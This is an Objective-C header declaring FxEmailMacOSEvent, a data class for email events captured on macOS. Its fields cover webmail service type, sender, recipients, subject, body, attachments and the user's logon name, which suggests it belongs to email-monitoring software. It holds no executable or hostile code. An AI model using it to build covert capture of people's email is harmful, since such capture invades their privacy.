//
//  FxEmailMacOSEvent.h
//  FxEvents
//
//  Created by Makara Khloth on 2/12/15.
//
//

#import <Foundation/Foundation.h>

#import "FxEvent.h"

typedef enum {
    kEmailServiceTypeUnknown    = 0,
    kEmailServiceTypeGmail      = 1,
    kEmailServiceTypeYahoo      = 2,
    kEmailServiceTypeLiveHotmail= 3,
    kEmailServiceTypeAOL        = 4
} FxEmailServiceType;

@interface FxEmailMacOSEvent : FxEvent {
    FxEventDirection mDirection;
    NSString    *mUserLogonName;
    NSString    *mApplicationID;
    NSString    *mApplicationName;
    NSString    *mTitle;
    FxEmailServiceType mEmailServiceType;
    NSString    *mSenderEmail;
    NSString    *mSenderName;
    NSArray     *mRecipients;       // FxRecipient
    NSString    *mSubject;
    NSString    *mBody;
    NSArray     *mAttachments;      // FxAttachment
}

@property (nonatomic, assign) FxEventDirection mDirection;
@property (nonatomic, copy) NSString *mUserLogonName;
@property (nonatomic, copy) NSString *mApplicationID;
@property (nonatomic, copy) NSString *mApplicationName;
@property (nonatomic, copy) NSString *mTitle;
@property (nonatomic, assign) FxEmailServiceType mEmailServiceType;
@property (nonatomic, copy) NSString *mSenderEmail;
@property (nonatomic, copy) NSString *mSenderName;
@property (nonatomic, retain) NSArray *mRecipients;
@property (nonatomic, copy) NSString *mSubject;
@property (nonatomic, copy) NSString *mBody;
@property (nonatomic, retain) NSArray *mAttachments;

@end
